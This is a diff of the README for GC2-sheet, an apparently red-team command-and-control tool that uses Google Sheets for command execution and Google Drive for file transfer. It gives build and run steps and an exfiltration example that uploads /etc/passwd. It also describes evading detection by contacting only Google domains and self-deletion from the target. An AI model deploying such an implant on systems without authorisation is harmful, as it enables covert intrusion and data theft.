@@ -8,25 +8,17 @@ GC2 (Google Command and Control) is a Command and Control application that allow
 
 # Why
 
-This program has been developed in order to provide a command and control that does not require any particular set up (like: a custom domain, VPS, CDN, ...) during Red Teaming activities.
+This project has been developed to provide a command and control that does not require any particular set up (like: a custom domain, VPS, CDN, ...) during Red Teaming activities.
 
 Furthermore, the program will interact only with Google's domains (*.google.com) to make detection more difficult.
 
 # Set up
 
-1. **Build executable**
+1. **Create a new Google "service account"**
  
-    ```bash
-    git clone https://github.com/looCiprian/GC2-sheet
-    cd GC2-sheet
-    go build gc2-sheet.go
-    ```
+    Create a new Google "service account" using [https://console.cloud.google.com/](https://console.cloud.google.com/), create a .json key file for the service account 
 
-2. **Create a new google "service account"**
- 
-    Create a new google "service account" using [https://console.cloud.google.com/](https://console.cloud.google.com/), create a .json key file for the service account 
-
-3. **Enable Google Sheet API and Google Drive API**
+2. **Enable Google Sheet API and Google Drive API**
 
     Enable Google Drive API [https://developers.google.com/drive/api/v3/enable-drive-api](https://developers.google.com/drive/api/v3/enable-drive-api) and Google Sheet API [https://developers.google.com/sheets/api/quickstart/go](https://developers.google.com/sheets/api/quickstart/go) 
 
@@ -44,27 +36,65 @@ Furthermore, the program will interact only with Google's domains (*.google.com)
         <img alt="Sheet Permission" src="img/drive_permissions.png" height="60%" width="60%">
     </p>    
 
-4. **Start the C2**
+4. **Download the C2**
+
+    The C2 can be cloned directly from GitHub:
+
+    ```
+    git clone https://github.com/looCiprian/GC2-sheet
+    cd GC2-sheet
+    ```
+
+5. **Configure the C2**
+
+    The preferred way to configure the C2 is by modifying the `options.yml` file inside the `cmd` directory.
+
+    The `options.yml` file is structured as follows:
+
+    ```
+    key: # escaped JSON key
+    sheet: # sheetID
+    drive: # driveID
+    verbose: # verbose true or false
+    ```
+
+6. **Build executable**
+ 
+    ```
+    go build gc2-sheet.go
+    ```
+
+7. **Run**
+
+    If the configuration file has been modified just run:
+
+    ```
+    ./gc2-sheet
+    ```
+
+    Otherwise, it is possible to use the command options after compiling the C2:
 
     ```
     gc2-sheet --key <GCP service account credential file .JSON > --sheet <Google sheet ID> --drive <Google drive ID>
     ```
-   
-   PS: you can also hardcode the parameters in the code, so you will upload only the executable on the target machine (look at comments in root.go and authentication.go)
 
-## Features
+## Troubleshooting
+
+Most of the errors can be detected by setting the `verbose` flag to `true`. By default, the C2 does not generate any output or error information.
+
+# Features
 
 - Command execution using Google Sheet as a console
 - Download files on the target using Google Drive
 - Data exfiltration using Google Drive
 - Exit
 
-### Command execution
+## Command execution
 
 The program will perform a request to the spreedsheet every 5 sec to check if there are some new commands.
-Commands must be inserted in the column "A", and the output will be printed in the column "B". 
+Commands must be inserted in column `A`, and the output will be printed in the column `B`. 
 
-### Data exfiltration file
+## Data exfiltration file
 
 Special commands are reserved to perform the upload and download to the target machine
 
@@ -75,7 +105,7 @@ Example:
 upload;/etc/passwd
  ```
 
-### Download file
+## Download file
 
 Special commands are reserved to perform the upload and download to the target machine
 
@@ -86,14 +116,14 @@ Example:
 download;<file ID>;/home/user/downloaded.txt
  ```
 
-### Exit
+## Exit
 
 By sending the command *exit*, the program will delete itself from the target and kill its process
 
 PS: From *os* documentation: 
-*If a symlink was used to start the process, depending on the operating system, the result might be the symlink or the path it pointed to*. In this case the symlink is deleted.
+*If a symlink was used to start the process, depending on the operating system, the result might be the symlink or the path it pointed to*. In this case, the symlink is deleted.
 
-### WorkFlow
+# Workflow
 
 <p align="center">
   <img alt="Work Flow" src="img/GC2-workflow.png" height="60%" width="60%">
